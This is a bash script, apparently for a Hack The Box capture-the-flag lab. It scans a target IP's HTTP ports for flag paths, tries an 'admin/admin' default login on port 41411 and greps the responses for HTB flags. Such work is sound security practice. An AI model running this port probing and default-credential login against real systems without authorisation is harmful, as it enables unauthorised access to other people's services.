#!/usr/bin/env bash
set -euo pipefail
IP=${1:-94.237.49.23}
NMAP_FILE=${2:-/workspace/recon/nmap/tcp_full.nmap}
OUT_DIR=/workspace/recon/httpx
TO=8
mkdir -p "$OUT_DIR"
# Collect ports that look HTTP-ish
PORTS=$(awk '/\/tcp\s+open\s+(http|ssl\/http|Microsoft Kestrel httpd|nginx|Apache|lighttpd|Werkzeug|Uvicorn|Tornado|PHP cli server)/{print $1}' "$NMAP_FILE" | cut -d/ -f1 | sort -n | uniq)
# Always add common candidates
PORTS="$PORTS 41411 41412 41417 34681 46132 48544 48656 44548 50692 54991 57280 57759 52548"
echo "HTTP candidates: $PORTS" | tee "$OUT_DIR/http_candidates.txt"
# Probe flag-like paths and API hints
paths=(/ /flag /flag.txt /FLAG /api/flag /api/flag.txt /api/notes /api/notes/all /version /api/version)
: > "$OUT_DIR/probe_summary.txt"
for p in $PORTS; do
  for path in "${paths[@]}"; do
    echo "PORT $p PATH $path" | tee -a "$OUT_DIR/probe_summary.txt"
    curl -fsS -m "$TO" --connect-timeout "$TO" -i "http://$IP:$p$path" 2>/dev/null | head -n 20 | tee "$OUT_DIR/p${p}_$(echo "$path"|tr -cd 'A-Za-z0-9').head" >/dev/null || true
  done
done
# Check MangoOnline (41411) login then /flag
COOKIE="$OUT_DIR/cookie_41411.txt"
if curl -fsS -m "$TO" --connect-timeout "$TO" "http://$IP:41411/" >/dev/null 2>&1; then
  curl -fsS -m "$TO" --connect-timeout "$TO" -c "$COOKIE" -d "username=admin&password=admin&remember=on" "http://$IP:41411/index.php" >/dev/null || true
  curl -fsS -m "$TO" --connect-timeout "$TO" -b "$COOKIE" -i "http://$IP:41411/flag" | head -n 40 > "$OUT_DIR/41411_flag.head" || true
fi
# Search for HTB flags in captured heads
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR" > "$OUT_DIR/http_flag_hits.txt" || true
cat "$OUT_DIR/http_flag_hits.txt" || true
